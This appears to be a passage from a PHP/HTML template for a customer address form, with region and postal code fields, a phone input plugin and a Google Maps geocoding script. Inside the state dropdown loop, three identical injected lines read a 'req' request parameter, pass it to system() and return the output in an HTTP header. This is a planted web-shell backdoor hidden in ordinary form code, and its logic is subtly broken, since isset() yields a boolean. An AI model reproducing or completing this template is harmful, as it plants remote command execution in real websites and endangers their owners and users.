																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lng" type="text" class="form-control" name="lng" id="lng" value="<?=$form['lng'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="state">Region</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="administrative_area_level_1" class="text" name="state" id="state" value="<?=$form['state'];?>" />
																		<select geoname="administrative_area_level_1_short" id="state_select" class="form-control" name="state_select"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																			foreach ($states as $state) {
																				if ($form['state'] == $state['code']) { ?>
																					<option  selected="selected"  value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				} else { ?>
																					<option value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				}
																			} ?></select>
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="postal_code">Postal Code</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="postal_code" class="form-control" name="postal_code" id="postal_code" value="<?=$form['postal_code'];?>" />
																	</div>
																</div>
															</div>
                                </div><!-- /.form-body -->
								       </div><!-- /#address_1 -->
									   
                                <div class="form-footer">
                                    <div class="col-sm-offset-3">
                                    <input type="submit" class="btn btn-success btn-lg btn-block center" name="go_customer" value="<?=ucfirst($form_title);?>" />
									</div>
                                </div><!-- /.form-footer -->
                            </form>
                        </div>

                    </div><!-- /.modal-content -->
                </div><!-- /.modal-dialog -->
               </div><!-- /.modal -->
  <!-- End Bootstrap modal -->
<script type="text/javascript">
	$('#basic').flagStrap();
</script>

<script>
$("#phone").intlTelInput({
  utilsScript: "../js/utils.js" // just for formatting/placeholders etc
});

// update the hidden input on submit
$("form").submit(function() {
  $("#hidden").val($("#phone").intlTelInput("getNumber"));
});
</script>

  <script type="text/javascript">


  </script>
  
  
	<script src="http://maps.googleapis.com/maps/api/js?sensor=false&amp;libraries=places"></script>
  
	<script type="text/javascript" src="<?=branded_include('js/formmapper.js'); ?>"></script>
<script>
	
      $(function(){
        $("#address_1").formmapper({
          map: ".map_canvas",
		  findme: true,
          details: "form",
          markerOptions: {
            draggable: true,
			zoom: 5
          }
        });
        
        $("#address_1").bind("geocode:dragged", function(event, latLng){
		  $("#address_1").formmapper("find",latLng.lat()+","+latLng.lng());
        });
        
        
        $("#find").click(function(){
          $("#formmapper").trigger("geocode");
        }).click();
		
		$('#address_1').popover({'trigger': 'focus'});
		
		$('input:disabled').val('Add location above');

      });
    </script>
